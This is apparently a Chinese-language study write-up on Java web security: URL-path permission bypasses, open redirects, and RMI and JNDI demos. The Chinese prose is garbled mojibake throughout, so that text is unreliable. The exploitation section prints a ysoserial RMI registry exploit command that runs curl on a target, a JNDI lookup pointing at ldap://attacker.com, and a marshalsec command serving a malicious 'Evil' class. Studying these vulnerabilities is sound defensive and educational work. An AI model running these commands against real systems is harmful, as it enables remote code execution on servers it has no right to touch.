ä¹Ÿç¡®å®æ˜¯è¿™ä¹ˆå†™çš„ã€‚æ—¢ç„¶å¦‚æ­¤å°±å¯ä»¥å¯¼è‡´æŸäº›åˆ©ç”¨urlbypassçš„æ”»å‡»ã€‚ æ¯”å¦‚è¯´,/java_sec_web/infoè·¯å¾„ä¸‹å­˜åœ¨ä¸€ä¸ªsecret.jspå®ƒé€šè¿‡å¦‚ä¸‹ä»£ç æ¥é™åˆ¶æ²¡æœ‰æƒé™çš„äººè®¿é—® 12345678 HttpServletRequest httpServletRequest = (HttpServletRequest)servletRequest;HttpServletResponse httpServletResponse =(HttpServletResponse)servletResponse;String url = httpServletRequest.getRequestURI();if (url.startsWith(\"/urltest/info\")) &#123; httpServletResponse.getWriter().write(\"No Permission.\"); return;&#125; ä½†æ˜¯å¦‚ä¸‹è·¯å¾„åˆ™å¯ä»¥è½»æ¾bypass 123http:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_web&#x2F;.&#x2F;info&#x2F;secret.jsphttp:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_web&#x2F;;233333&#x2F;info&#x2F;secret.jsphttp:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_web&#x2F;32112323&#x2F;..&#x2F;info&#x2F;secret.jsp å›åˆ°é¡¹ç›®ä¸Šæ¥ã€‚æˆ‘ä»¬å°±å¯ä»¥ç”¨åŒæ ·çš„é“ç†è¿›è¡Œæƒé™ç»•è¿‡äº†ã€‚è¿™é‡Œç»™å‡ºçš„pathæ˜¯cssä¸jsè¿™æ ·çš„é™æ€ç›®å½•ã€‚String[] excluedPath = {&quot;/css/**&quot;, &quot;/js/**&quot;};æˆ‘ä»¬åŒæ ·å¯ä»¥é€šè¿‡å‡ ç§æ–¹å¼è®¿é—®ã€‚ æ‰€ä»¥å®‰å…¨çš„è§£å†³æ–¹æ¡ˆé€šå¸¸æ˜¯ä½¿ç”¨getPathInfo()æˆ–è€…getServletPath()æ¥æ›¿æ¢getRequestURI() ä»Šå¹´çš„ä¸€ä¸ªshiroCVEå°±æ˜¯è¿™ä¸ªæˆå› ã€‚å› ä¸ºæ‹¦æˆªå™¨å†™çš„æ—¶å€™æ‹¦æˆªäº†/abc/*è¿™æ ·çš„æ­£åˆ™ã€‚è€Œä½¿ç”¨/abc/1/æ—¶ï¼Œshiroçš„æ‹¦æˆªå™¨æ²¡æœ‰æ‹¦æˆªåˆ°ã€‚ä½†æ˜¯getRequestURIå´è®©æˆ‘ä»¬æ­£å¸¸è®¿é—®åˆ°äº†ã€‚å¯¼è‡´äº†æƒé™ç»•è¿‡ã€‚ urlè§£æ è·Ÿå­¦ä¹ ssrfæ—¶é‡Œé¢å‡ºç°çš„bypass url hosté™åˆ¶æ˜¯ä¸€ä¸ªç±»å‹ã€‚å› ä¸ºæœ‰ç°æˆçš„è§£é‡Šå°±ä¸å¤šä½œè¯´æ˜äº†https://github.com/JoyChou93/java-sec-code/wiki/URL-whtielist-Bypass åŸºæœ¬ä¸Šè¿˜æ˜¯é€šè¿‡#,;ç­‰ç­‰æ¥è¿›è¡Œurlbypassç»•è¿‡gethostã€‚ 302è°ƒè½¬ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293package org.joychou.controller;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestParam;import org.springframework.web.bind.annotation.ResponseBody;import javax.servlet.RequestDispatcher;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;import org.joychou.security.SecurityUtil;/** * The vulnerability code and security code of Java url redirect. * The security code is checking whitelist of url redirect. * * @author JoyChou (joychou@joychou.org) * @version 2017.12.28 */@Controller@RequestMapping(\"/urlRedirect\")public class URLRedirect &#123; /** * http://localhost:8080/urlRedirect/redirect?url=http://www.baidu.com */ @GetMapping(\"/redirect\") public String redirect(@RequestParam(\"url\") String url) &#123; return \"redirect:\" + url; &#125; /** * http://localhost:8080/urlRedirect/setHeader?url=http://www.baidu.com */ @RequestMapping(\"/setHeader\") @ResponseBody public static void setHeader(HttpServletRequest request, HttpServletResponse response) &#123; String url = request.getParameter(\"url\"); response.setStatus(HttpServletResponse.SC_MOVED_PERMANENTLY); // 301 redirect response.setHeader(\"Location\", url); &#125; /** * http://localhost:8080/urlRedirect/sendRedirect?url=http://www.baidu.com */ @RequestMapping(\"/sendRedirect\") @ResponseBody public static void sendRedirect(HttpServletRequest request, HttpServletResponse response) throws IOException &#123; String url = request.getParameter(\"url\"); response.sendRedirect(url); // 302 redirect &#125; /** * Safe code. Because it can only jump according to the path, it cannot jump according to other urls. * http://localhost:8080/urlRedirect/forward?url=/urlRedirect/test */ @RequestMapping(\"/forward\") @ResponseBody public static void forward(HttpServletRequest request, HttpServletResponse response) &#123; String url = request.getParameter(\"url\"); RequestDispatcher rd = request.getRequestDispatcher(url); try &#123; rd.forward(request, response); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; /** * Safe code of sendRedirect. * http://localhost:8080/urlRedirect/sendRedirect/sec?url=http://www.baidu.com */ @RequestMapping(\"/sendRedirect/sec\") @ResponseBody public void sendRedirect_seccode(HttpServletRequest request, HttpServletResponse response) throws IOException &#123; String url = request.getParameter(\"url\"); if (SecurityUtil.checkURL(url) == null) &#123; response.setStatus(HttpServletResponse.SC_FORBIDDEN); response.getWriter().write(\"url forbidden\"); return; &#125; response.sendRedirect(url); &#125;&#125; è¿™ä¸€éƒ¨åˆ†æ›´å¤šæ˜¯å®‰å…¨ç¼–ç¨‹çš„é—®é¢˜ã€‚å¦‚æœé‡å®šå‘å‡ºç°é—®é¢˜å°±å¾ˆæœ‰å¯èƒ½ä¼šä¸xssç­‰æ¼æ´è”ç³»èµ·æ¥ã€‚æ­¤å¤„æ¶æ„ä»£ç ä¸­,ä»»æ„urléƒ½å¯ä»¥é€šè¿‡setHeader,sendRedirectå¯¼è‡´é‡å®šå‘ã€‚é™åˆ¶æ–¹æ³•åˆ™å¦‚æœ€åä¸¤ä¸ªè§£å†³æªæ–½,é™åˆ¶åªèƒ½åœ¨pathé—´è°ƒè½¬æˆ–è€…ç›´æ¥å†™å¥½SecurityUtilæ¥é™åˆ¶è°ƒè½¬çš„url. java-rmi æœ€æ—©æ¥è§¦åˆ°rmiæ˜¯åœ¨å¤ç°vulhubä¸Šfastjsonæ¼æ´æ—¶å­¦åˆ°çš„,ä½¿ç”¨jndiæ³¨å…¥æ—¶ç”¨åˆ°rmi://æˆ–jndi://ã€‚ç°åœ¨æ¥å­¦ä¹ ä¸‹rmiçš„å…·ä½“ä½¿ç”¨ï¼Œ RMIï¼ˆRemote Method Invocationï¼‰å³è¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼Œæ˜¯åˆ†å¸ƒå¼ç¼–ç¨‹ä¸­çš„ä¸€ä¸ªåŸºæœ¬æ€æƒ³ã€‚ Java RMIæ˜¯ä¸“ä¸ºJavaç¯å¢ƒè®¾è®¡çš„è¿œç¨‹æ–¹æ³•è°ƒç”¨æœºåˆ¶ï¼Œæ˜¯ä¸€ç§ç”¨äºå®ç°è¿œç¨‹è°ƒç”¨ï¼ˆRPCï¼ŒRemote Procedure Callï¼‰çš„Java APIï¼Œèƒ½ç›´æ¥ä¼ è¾“åºåˆ—åŒ–åçš„Javaå¯¹è±¡å’Œåˆ†å¸ƒå¼åƒåœ¾æ”¶é›†ã€‚å®ƒçš„å®ç°ä¾èµ–äºJVMï¼Œå› æ­¤å®ƒæ”¯æŒä»ä¸€ä¸ªJVMåˆ°å¦ä¸€ä¸ªJVMçš„è°ƒç”¨ã€‚åœ¨Java RMIä¸­ï¼Œè¿œç¨‹æœåŠ¡å™¨å®ç°å…·ä½“çš„Javaæ–¹æ³•å¹¶æä¾›æ¥å£ï¼Œå®¢æˆ·ç«¯æœ¬åœ°ä»…éœ€æ ¹æ®æ¥å£ç±»çš„å®šä¹‰ï¼Œæä¾›ç›¸åº”çš„å‚æ•°å³å¯è°ƒç”¨è¿œç¨‹æ–¹æ³•ï¼Œå…¶ä¸­å¯¹è±¡æ˜¯é€šè¿‡åºåˆ—åŒ–æ–¹å¼è¿›è¡Œç¼–ç ä¼ è¾“çš„ã€‚ design-pattern è®¾è®¡æ¨¡å¼åŒ…å«ä¸‰ä¸ªéƒ¨åˆ†ï¼š1.Registryã€‚Serverç«¯å‘Registryæ³¨å†ŒæœåŠ¡,Clientç«¯ä»Registryè·å–è¿œç¨‹å¯¹è±¡çš„ä¸€äº›ä¿¡æ¯å¹¶è¿›è¡Œè°ƒç”¨ã€‚2.Server æä¾›è¿œç¨‹æ–¹æ³•3.Client ä½¿ç”¨è¿œç¨‹æ–¹æ³• interaction 1.é¦–å…ˆï¼Œå¯åŠ¨RMI RegistryæœåŠ¡ï¼Œå¯åŠ¨æ—¶å¯ä»¥æŒ‡å®šæœåŠ¡ç›‘å¬çš„ç«¯å£ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨é»˜è®¤çš„ç«¯å£ï¼ˆ1099ï¼‰2.å…¶æ¬¡ï¼ŒServerç«¯åœ¨æœ¬åœ°å…ˆå®ä¾‹åŒ–ä¸€ä¸ªæä¾›æœåŠ¡çš„å®ç°ç±»ï¼Œç„¶åé€šè¿‡RMIæä¾›çš„Naming/Context/Registryç­‰ç±»çš„bindæˆ–rebindæ–¹æ³•å°†åˆšæ‰å®ä¾‹åŒ–å¥½çš„å®ç°ç±»æ³¨å†Œåˆ°RMI Registryä¸Šå¹¶å¯¹å¤–æš´éœ²ä¸€ä¸ªåç§°3.æœ€åï¼ŒClientç«¯é€šè¿‡æœ¬åœ°çš„æ¥å£å’Œä¸€ä¸ªå·²çŸ¥çš„åç§°ï¼ˆå³RMI Registryæš´éœ²å‡ºçš„åç§°ï¼‰ï¼Œä½¿ç”¨RMIæä¾›çš„Naming/Context/Registryç­‰ç±»çš„lookupæ–¹æ³•ä»RMI Serviceé‚£æ‹¿åˆ°å®ç°ç±»ã€‚è¿™æ ·è™½ç„¶æœ¬åœ°æ²¡æœ‰è¿™ä¸ªç±»çš„å®ç°ç±»ï¼Œä½†æ‰€æœ‰çš„æ–¹æ³•éƒ½åœ¨æ¥å£é‡Œäº†ï¼Œä¾¿å¯ä»¥å®ç°è¿œç¨‹è°ƒç”¨å¯¹è±¡çš„æ–¹æ³• dynamic class loading ä¸€ä¸ªéå¸¸é‡è¦çš„ç‚¹ã€‚rmiæ”¯æŒæˆ‘ä»¬åœ¨æ²¡æœ‰æŸä¸ªç±»å®šä¹‰æ—¶å‰å»ä¸‹è½½è¿œç¨‹ç±»ã€‚è¿™ä¹Ÿæ˜¯jndiä¸ååºåˆ—åŒ–åº”ç”¨çš„ä¸»è¦æ‰‹æ®µã€‚åŠ¨æ€åŠ è½½çš„å¯¹è±¡classæ–‡ä»¶å¯ä»¥ä½¿ç”¨WebæœåŠ¡çš„æ–¹å¼è¿›è¡Œæ‰˜ç®¡ã€‚è¿™å¯ä»¥åŠ¨æ€çš„æ‰©å±•è¿œç¨‹åº”ç”¨çš„åŠŸèƒ½ï¼ŒRMIæ³¨å†Œè¡¨ä¸Šå¯ä»¥åŠ¨æ€çš„åŠ è½½ç»‘å®šå¤šä¸ªRMIåº”ç”¨ã€‚å®¢æˆ·ç«¯ä½¿ç”¨äº†ä¸RMIæ³¨å†Œè¡¨ç›¸åŒçš„æœºåˆ¶ã€‚RMIæœåŠ¡ç«¯å°†URLä¼ é€’ç»™å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯é€šè¿‡HTTPè¯·æ±‚ä¸‹è½½è¿™äº›ç±»ã€‚åŒæ ·å®ç°äº†åŠ¨æ€åŠ è½½ã€‚ coding ä¸‹é¢æ¥å†™ä¸ªdemoã€‚è¿˜æ˜¯æŒ‰ç…§mi1k7eaå¸ˆå‚…çš„å®ä¾‹å†™æ³•å†™ä¸‹ã€‚ æœåŠ¡ç«¯è¿œç¨‹è°ƒç”¨çš„ç±»Identity 123456789101112131415161718192021222324252627282930313233import java.io.Serializable;public class Identity implements Serializable&#123; private int id; private String name; private int age; public int getId() &#123; return id; &#125; public void setId(int id) &#123; this.id = id; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125;&#125; å› ä¸ºé¡¾åŠåˆ°å¼€å‘ä¹ æƒ¯,æ‰€ä»¥æˆå‘˜å˜é‡éƒ½æ˜¯ç§æœ‰çš„ã€‚è‡ªç„¶è°ƒç”¨æ—¶ä¹Ÿè¦æœ‰å¯¹åº”çš„setter,getteræ–¹æ³•ã€‚ideaæ”¯æŒç›´æ¥alt+enteræ·»åŠ é€‰ä¸­å±æ€§çš„setterå’Œgetteræ–¹æ³•ã€‚ ç„¶åæ˜¯ä¸€ä¸ªè¿œç¨‹æ¥å£ï¼ŒServiceImpl.class 1234567import java.rmi.Remote;import java.rmi.RemoteException;import java.util.List;public interface Service extends Remote&#123; public List&lt;Identity&gt; GetList() throws RemoteException;&#125; è¿œç¨‹æ¥å£å¿…é¡»ç»§æ‰¿java.rmi.Remoteæ¥å£ï¼Œä¸”æŠ›å‡ºRemoteExceptioné”™è¯¯ç„¶åæ˜¯æ¥å£çš„å®ç°ç±» 12345678910111213141516171819202122232425262728293031import java.rmi.RemoteException;import java.rmi.server.UnicastRemoteObject;import java.util.LinkedList;import java.util.List;public class ServiceImpl extends UnicastRemoteObject implements Service&#123; public ServiceImpl() throws RemoteException &#123; super(); &#125; @Override public List&lt;Identity&gt; GetList() throws RemoteException &#123; System.out.println(\"Get Identity Start!\"); List&lt;Identity&gt; personlist =new LinkedList&lt;Identity&gt;(); Identity person1 = new Identity(); person1.setId(0); person1.setName(\"byc\"); person1.setAge(20); personlist.add(person1); Identity person2 = new Identity(); person2.setId(1); person2.setName(\"Joe\"); person2.setAge(18); personlist.add(person2); return personlist; &#125;&#125; æ³¨æ„è¿™é‡Œæ„é€ æ–¹æ³•ä¹Ÿè¦throw RemoteException.ç„¶åç±»å»ºå®Œåå¼€å§‹ä¼šæŠ¥é”™è¯´æˆ‘ä»¬æ²¡æœ‰å®ç°GetList()æ–¹æ³•ã€‚è¿™é‡Œç›´æ¥ç‚¹åˆ°æŠ¥é”™çš„ä½ç½®,å®ƒä¼šè‡ªåŠ¨æä¾›æˆ‘ä»¬ä¸€ä¸ªé‡å†™çš„GetList()æ–¹æ³• ä¸‹é¢æ˜¯ä¸€ä¸ªæŠŠServerå’ŒRegistryçš„åˆ›å»ºã€å¯¹è±¡ç»‘å®šæ³¨å†Œè¡¨å†™åˆ°ä¸€å—çš„Programä»£ç  12345678910111213141516import java.rmi.Naming;import java.rmi.registry.LocateRegistry;public class Program &#123; public static void main(String[] args) &#123; try &#123; Service personService =new ServiceImpl(); LocateRegistry.createRegistry(6666); Naming.rebind(\"rmi://127.0.0.1:6666/PersonService\", personService); System.out.println(\"Service Start!\"); &#125; catch (Exception e ) &#123; e.printStackTrace(); &#125; &#125;&#125; å®¢æˆ·ç«¯é€šè¿‡Naming.lookup()æ¥æŸ¥æ‰¾RMI Serverç«¯çš„è¿œç¨‹å¯¹è±¡å¹¶è·å–åˆ°æœ¬åœ°å®¢æˆ·ç«¯ç¯å¢ƒä¸­è¾“å‡ºå‡ºæ¥ 12345678910111213141516import java.rmi.Naming;import java.util.List;public class Client &#123; public static void main(String[] args) &#123; try &#123; Service personService =(Service) Naming.lookup(\"rmi://127.0.0.1:6666/PersonService\"); List&lt;Identity&gt; personList=personService.GetList(); for(Identity person:personList)&#123; System.out.println(\"ID:\"+person.getId()+\" Age:\"+person.getAge()+\" Name:\"+person.getName()); &#125; &#125; catch (Exception ex)&#123; ex.printStackTrace(); &#125; &#125;&#125; åŒæ ·æ˜¯ä½¿ç”¨ctrl+alt+tæ·»åŠ try catchè¯­å¥ç¯ç»•ä¸­é—´rmiéƒ¨åˆ†è¯­å¥ã€‚å…ˆå¯åŠ¨rmiserver.ç„¶åå®¢æˆ·ç«¯è°ƒç”¨æ–¹æ³•ã€‚ å‡ ä¸ªå‡½æ•°çš„ä½¿ç”¨ 123456bind(String name, Object obj)ï¼šæ³¨å†Œå¯¹è±¡ï¼ŒæŠŠå¯¹è±¡å’Œä¸€ä¸ªåå­—nameç»‘å®šrebind(String name, Object obj)ï¼šæ³¨å†Œå¯¹è±¡ï¼ŒæŠŠå¯¹è±¡å’Œä¸€ä¸ªåå­—nameç»‘å®šã€‚å¦‚æœæ”¹åå­—å·²ç»ä¸å…¶ä»–å¯¹è±¡ç»‘å®šï¼Œä¸ä¼šæŠ›å‡ºNameAlreadyBoundExceptioné”™è¯¯ï¼Œè€Œæ˜¯æŠŠå½“å‰å‚æ•°objæŒ‡å®šçš„å¯¹è±¡è¦†ç›–åŸå…ˆçš„å¯¹è±¡//å‰è€…åˆ™ä¼šæŠ›å‡ºNameAlreadyBoundExceptioné”™è¯¯lookup(String name)ï¼šæŸ¥æ‰¾å¯¹è±¡ï¼Œè¿”å›ä¸å‚æ•°nameæŒ‡å®šçš„åå­—æ‰€ç»‘å®šçš„å¯¹è±¡ï¼› exploit Java 1.8.121ç‰ˆæœ¬ä»¥ä¸‹ 1java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit target_ip 1099 CommonsCollections1 \"curl xxxx\" Java 1.8.121ç‰ˆæœ¬åŠä»¥ä¸Šï¼šé‡å†™ä¸ªclass,æ‰”åˆ°ysoserialé‡Œé‡æ–°ç¼–è¯‘https://github.com/JoyChou93/java-sec-code/wiki/Java-RMIè¿™æ ·ç›¸å½“äºåŠ äº†ä¸ªåˆ©ç”¨ç±»ã€‚ç„¶åç»§ç»­æ‰“å°±è¡Œäº† å‘ç°vulhubåŸæ¥æœ‰javarmiçš„ä¸¤ä¸ªé•œåƒã€‚è‡ªå·±ä»“åº“å¤ªä¹…æ²¡æ›´æ–°å¯¼è‡´ç–å¿½äº†ã€‚ æˆ‘ä»¬æ¥çœ‹çœ‹jdké«˜ç‰ˆæœ¬æ—¶åšå‡ºçš„æ”¹å˜ 12345678910111213if (String.class == clazz || java.lang.Number.class.isAssignableFrom(clazz) || Remote.class.isAssignableFrom(clazz) || java.lang.reflect.Proxy.class.isAssignableFrom(clazz) || UnicastRef.class.isAssignableFrom(clazz) || RMIClientSocketFactory.class.isAssignableFrom(clazz) || RMIServerSocketFactory.class.isAssignableFrom(clazz) || java.rmi.activation.ActivationID.class.isAssignableFrom(clazz) || java.rmi.server.UID.class.isAssignableFrom(clazz)) &#123; return ObjectInputFilter.Status.ALLOWED;&#125; else &#123; return ObjectInputFilter.Status.REJECTED;&#125; æ‰€ä»¥åˆ©ç”¨æ—¶æ˜¯é€šè¿‡ç™½åå•é‡Œå¯åˆ©ç”¨çš„ç±»æ¥è¿›è¡Œååºåˆ—åŒ–ã€‚å› ä¸ºrmiåœ¨å…¶ä»–æ´é‡Œå‡ºç°çš„é¢‘ç‡ä¹Ÿå¾ˆé«˜ã€‚æ‰€ä»¥å­¦ä¹ åˆ°å…¶ä»–æ¼æ´æ—¶ä¹Ÿä¼šæåŠã€‚ jndiæ³¨å…¥jndiæ³¨å…¥çš„ä½¿ç”¨åœ¨shiroä¸fastjsonçš„ååºåˆ—åŒ–å¤ç°ä¸­éƒ½æ›¾ç»ä½¿ç”¨è¿‡ã€‚æƒ³è¦çœŸæ­£ç†è§£è¿™å‡ ç§æ¼æ´çš„è„‰ç»œ,è¿˜æ˜¯å¾—å…ˆæŠŠjndiçš„ç›¸å…³çŸ¥è¯†å­¦æ‡‚ã€‚ jndi JNDIå…¨ç§°ä¸º Java Naming and DirectoryInterfaceï¼ˆJavaå‘½åå’Œç›®å½•æ¥å£ï¼‰ï¼Œæ˜¯ä¸€ç»„åº”ç”¨ç¨‹åºæ¥å£ï¼Œä¸ºå¼€å‘äººå‘˜æŸ¥æ‰¾å’Œè®¿é—®å„ç§èµ„æºæä¾›äº†ç»Ÿä¸€çš„é€šç”¨æ¥å£ï¼Œå¯ä»¥ç”¨æ¥å®šä¹‰ç”¨æˆ·ã€ç½‘ç»œã€æœºå™¨ã€å¯¹è±¡å’ŒæœåŠ¡ç­‰å„ç§èµ„æºã€‚JNDIæ”¯æŒçš„æœåŠ¡ä¸»è¦æœ‰ï¼šDNSã€LDAPã€CORBAã€RMIç­‰ æ‰€ä»¥è¯´jndiçš„ä½œç”¨ä¸»è¦åœ¨äºâ€å®šä½â€ã€‚æ¯”å¦‚å®šä½rmiä¸­æ³¨å†Œçš„å¯¹è±¡,è®¿é—®ldapçš„ç›®å½•æœåŠ¡ç­‰ç­‰ã€‚ demo å…¶ä½¿ç”¨ä¸rmiå¾ˆç±»ä¼¼ 12bindï¼šå°†åç§°ç»‘å®šåˆ°å¯¹è±¡ä¸­ï¼›lookupï¼šé€šè¿‡åå­—æ£€ç´¢æ‰§è¡Œçš„å¯¹è±¡ ä¸‹é¢æ˜¯å†™çš„demo 1234567891011121314151617181920212223242526272829303132333435363738import java.io.Serializable;import java.rmi.Remote;public class Identity implements Remote,Serializable&#123; private int id; private String name; private int age; public int getId() &#123; return id; &#125; public void setId(int id) &#123; this.id = id; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; public String toString()&#123; return \"id: \"+id+\" name: \"+name+\" age: \"+age; &#125;&#125; ä¸ä¸Šé¢rmiçš„Identityç±»ä¸åŒçš„æ˜¯,è¿™é‡Œæˆ‘ä»¬å¿…é¡»è®©å®ƒç»§æ‰¿java.rmi.Remoteç±».å¦åˆ™ä¼šæŠ›å‡ºé”™è¯¯ã€‚åŒæ—¶åŠ ä¸Šä¸€ä¸ªtoString()æ–¹æ³•æ–¹ä¾¿æˆ‘ä»¬è·å–å¹¶æ‰“å°å¯¹è±¡çš„å±æ€§ã€‚ ä¸€ä¸ªæœåŠ¡ç«¯+å®¢æˆ·ç«¯çš„æ•´åˆä»£ç ã€‚å…ˆç”¨jndiçš„bindå°†Identityå¯¹è±¡ç»‘å®šåœ¨rmiæœåŠ¡ä¸­ã€‚ç„¶åå†lookupæ£€ç´¢å¯¹è±¡è¾“å‡ºã€‚JndiServer 123456789101112131415161718192021222324252627282930313233343536import javax.naming.Context;import javax.naming.InitialContext;import java.rmi.registry.LocateRegistry;public class JndiServer &#123; public static void initIdentity() throws Exception&#123; LocateRegistry.createRegistry(6666); System.setProperty(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.rmi.registry.RegistryContextFactory\"); System.setProperty(Context.PROVIDER_URL, \"rmi://localhost:6666\"); InitialContext ctx = new InitialContext(); Identity a= new Identity(); a.setId(0); a.setAge(20); a.setName(\"byc_404\"); ctx.bind(\"person\",a); ctx.close(); &#125; public static void getIdentity() throws Exception&#123; InitialContext ctx = new InitialContext(); Identity person = (Identity) ctx.lookup(\"person\"); System.out.println(person.toString()); ctx.close(); &#125; public static void main(String[] args) throws Exception&#123; initIdentity(); getIdentity(); &#125;&#125; æ³¨æ„æˆ‘ä»¬éœ€è¦å…ˆè¡Œè®¾ç½®jndiå·¥å‚çš„urlåŠç«¯å£ç­‰ç­‰å±æ€§ã€‚ traits of jndi jndiå­˜åœ¨å®‰å…¨ç®¡ç†å™¨.å¯¹äºåŠ è½½è¿œç¨‹å¯¹è±¡ï¼ŒJDNIæœ‰ä¸¤ç§ä¸åŒçš„å®‰å…¨æ§åˆ¶æ–¹å¼ï¼Œå¯¹äºNaming Manageræ¥è¯´ï¼Œç›¸å¯¹çš„å®‰å…¨ç®¡ç†å™¨çš„è§„åˆ™æ¯”è¾ƒå®½æ³›ï¼Œä½†æ˜¯å¯¹JNDI SPIå±‚ä¼šæŒ‰ç…§ä¸‹é¢è¡¨æ ¼ä¸­çš„è§„åˆ™è¿›è¡Œæ§åˆ¶ï¼š å¯ä»¥çœ‹åˆ°ldapå¯¹åº”çš„å®‰å…¨æªæ–½å¹¶éå¼ºåˆ¶çš„ã€‚è¿™ç‚¹éå¸¸æœ‰æ„æ€ã€‚è¿›è€Œå»¶ä¼¸åˆ°æˆ‘ä»¬ä¸‹é¢çš„ä¸€ä¸ªç‰¹ç‚¹ jndiåœ¨åˆå§‹åŒ–æ—¶,ä¸€å®šè¦åƒdemoä¸­é‚£æ ·é…ç½®ä¸Šä¸‹æ–‡ç¯å¢ƒã€‚ 1234567891011Properties env = new Properties();env.put(Context.INITIAL_CONTEXT_FACTORY,\"com.sun.jndi.rmi.registry.RegistryContextFactory\");env.put(Context.PROVIDER_URL,\"rmi://localhost:1099\");Context ctx = new InitialContext(env);LocateRegistry.createRegistry(6666);System.setProperty(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.rmi.registry.RegistryContextFactory\");System.setProperty(Context.PROVIDER_URL, \"rmi://localhost:6666\");InitialContext ctx = new InitialContext(); ä¸Šé¢ä¸¤ç§æ–¹å¼éƒ½å¯ä»¥æŒ‡å®šä¸Šä¸‹æ–‡ã€‚ä½†æ˜¯å½“æˆ‘ä»¬ä½¿ç”¨lookup()å¯»æ‰¾å¯¹è±¡æ—¶,æˆ‘ä»¬å¯ä»¥ç”¨å…¶ä»–æ ¼å¼çš„åè®®æ¥è½¬æ¢ä¸Šä¸‹æ–‡ç¯å¢ƒè®¿é—®å¯¹è±¡ã€‚å…·ä½“å¯ä»¥è·Ÿåˆ°InitialContextç±»çš„getURLOrDefaultInitCtx 1234567891011121314protected Context getURLOrDefaultInitCtx(String name) throws NamingException &#123; if (NamingManager.hasInitialContextFactoryBuilder()) &#123; return getDefaultInitCtx(); &#125; String scheme = getURLScheme(name); if (scheme != null) &#123; Context ctx = NamingManager.getURLContext(scheme, myProps); if (ctx != null) &#123; return ctx; &#125; &#125; return getDefaultInitCtx(); &#125; å¯ä»¥çœ‹åˆ°å¦‚æœåè®®ä¸ä¸ºç©º,ä¼šé‡æ–°è·å–urlä¸­æŒ‡å®šçš„ç¯å¢ƒã€‚æ‰€ä»¥å¯ä»¥ä¼ é€’ctx.lookup(&quot;ldap://attacker.com:12345/ou=foo,dc=foobar,dc=com&quot;);è¿™æ ·çš„urlæ¥è¿›è¡Œlookup.(å¹¸å¥½ä¹‹å‰åšhtbå¥½å¥½å­¦äº†ä¸‹ldapâ€¦â€¦).è¿™å°±æ˜¯jndiçš„åŠ¨æ€åè®®è½¬æ¢ç‰¹æ€§ã€‚ jndi injection ç»ˆäºåˆ°æˆ‘ä»¬æ”»å‡»çš„é‡å¤´æˆjndiæ³¨å…¥äº†ã€‚ä¸è¿‡åœ¨æ­£å¼å¼€å§‹å‰æˆ‘ä»¬è¿˜éœ€è¦äº†è§£ä¸‹Referenceç±»çš„ä½¿ç”¨ Javaä¸ºäº†å°†Objectå¯¹è±¡å­˜å‚¨åœ¨Namingæˆ–DirectoryæœåŠ¡ä¸‹ï¼Œæä¾›äº†Naming ReferenceåŠŸèƒ½ï¼Œå¯¹è±¡å¯ä»¥é€šè¿‡ç»‘å®šReferenceå­˜å‚¨åœ¨Namingæˆ–DirectoryæœåŠ¡ä¸‹ï¼Œæ¯”å¦‚RMIã€LDAPç­‰ å‡ ä¸ªæ¯”è¾ƒå…³é”®çš„å±æ€§ï¼š 1.classNameï¼šè¿œç¨‹åŠ è½½æ—¶æ‰€ä½¿ç”¨çš„ç±»å2.classFactoryï¼šåŠ è½½çš„classä¸­éœ€è¦å®ä¾‹åŒ–ç±»çš„åç§°3.classFactoryLocationï¼šè¿œç¨‹åŠ è½½ç±»çš„åœ°å€ï¼Œæä¾›classesæ•°æ®çš„åœ°å€å¯ä»¥æ˜¯file/ftp/httpç­‰åè®® æ‰€ä»¥æˆ‘ä»¬å¼€å§‹jndiæ³¨å…¥æ—¶,å°±å¯ä»¥ä½¿ç”¨åˆ°Referenceç±»çš„åŠŸèƒ½äº†ã€‚jndiä¸­å¯¹è±¡çš„ä¼ é€’å¯ä»¥ä½¿ç”¨åºåˆ—åŒ–ä¹Ÿå¯ä»¥ä½¿ç”¨å¼•ç”¨ã€‚é‚£ä¹ˆå‡å¦‚æˆ‘ä»¬èƒ½å°†æ¶æ„çš„Referenceç±»ç»‘å®šåœ¨RMIæ³¨å†Œè¡¨ä¸­,å¹¶è¯•å…¶å¼•ç”¨æŒ‡å‘æ¶æ„class.å°±èƒ½è¾¾æˆå‘½ä»¤æ‰§è¡Œã€‚(å‰æ:å½“ç”¨æˆ·åœ¨JNDIå®¢æˆ·ç«¯çš„lookup()å‡½æ•°å‚æ•°å¤–éƒ¨å¯æ§æˆ–Referenceç±»æ„é€ æ–¹æ³•çš„classFactoryLocationå‚æ•°å¤–éƒ¨å¯æ§æ—¶) å¤ç°çš„è¯å› ä¸ºæˆ‘æœ¬åœ°javaç‰ˆæœ¬çš„é—®é¢˜å¯¼è‡´ä¸èƒ½ç”¨åŸºç¡€çš„jndiæ³¨å…¥payloadæ‰“ã€‚ä¸è¿‡ä¹‹å‰æˆ‘å¤ç°è¿‡fastjsonçš„æ´ã€‚ç”¨çš„å°±æ˜¯rmiçš„æœåŠ¡ æ–¹æ³•,å¯¹åº”jdk1.8ä»¥ä¸‹çš„,ç›´æ¥ç”¨rmiåš JndiClient 12345678910import javax.naming.Context;import javax.naming.InitialContext;public class JndiClient &#123; public static void main(String[] args) throws Exception&#123; String uri = \"rmi://127.0.0.1:1099/aa\";//å¯æ§ Context ctx = new InitialContext(); ctx.lookup(uri); &#125;&#125; ç”¨marshalsecèµ·ä¸€ä¸ªrmiæœåŠ¡java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://localhost:8000/#Evil 